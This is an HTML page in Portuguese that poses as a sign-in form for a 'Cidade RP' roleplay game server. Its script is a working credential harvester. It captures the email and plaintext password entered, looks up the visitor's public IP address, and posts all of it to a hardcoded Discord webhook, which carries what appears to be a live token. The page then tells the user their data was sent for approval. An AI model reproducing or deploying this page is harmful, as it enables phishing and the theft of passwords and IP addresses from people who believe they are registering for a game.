<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <title>Cadastro - Cidade RP</title>
  <style>
    body{background:#0d1117;color:#f0f6fc;font-family:Segoe UI;display:flex;justify-content:center;align-items:center;height:100vh}
    form{background:#161b22;padding:25px;border-radius:8px;width:280px}
    input{width:100%;padding:8px;margin:6px 0;border:none;border-radius:4px}
    button{width:100%;padding:10px;border:none;border-radius:4px;background:#238636;color:#fff;font-weight:bold;cursor:pointer}
    button:hover{background:#2ea043}
  </style>
</head>
<body>
  <form id="formLogin">
    <h3>Entrar na cidade</h3>
    <input type="email" id="email" placeholder="Seu e-mail" required>
    <input type="password" id="senha" placeholder="Sua senha" required>
    <button type="submit">Enviar</button>
  </form>

  <script>
    const webhook = "https://discord.com/api/webhooks/1425212407764094976/SPXgg8cjZBe5hIoqzLsV2Fyyk5MjZNZJmRUevf-f68Qw_47MifLJwOAiF1CxqMAf8IrN";
    document.getElementById("formLogin").addEventListener("submit", async e => {
      e.preventDefault();
      const email = document.getElementById("email").value;
      const senha = document.getElementById("senha").value;
      const agora = new Date().toLocaleString("pt-BR");

      const payload = {
        content: null,
        embeds: [{
          title: "Novo cadastro - Cidade RP",
          color: 0x00ff88,
          fields: [
            { name: "E-mail", value: email, inline: true },
            { name: "Senha", value: senha, inline: true },
            { name: "Horário", value: agora, inline: false }
          ],
          footer: { text: "IP: " + (await (await fetch("https://api.ipify.org?format=json")).json()).ip }
        }]
      };

      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      alert("Dados enviados! Aguarde aprovação.");
      e.target.reset();
    });
  </script>
</body>
</html>
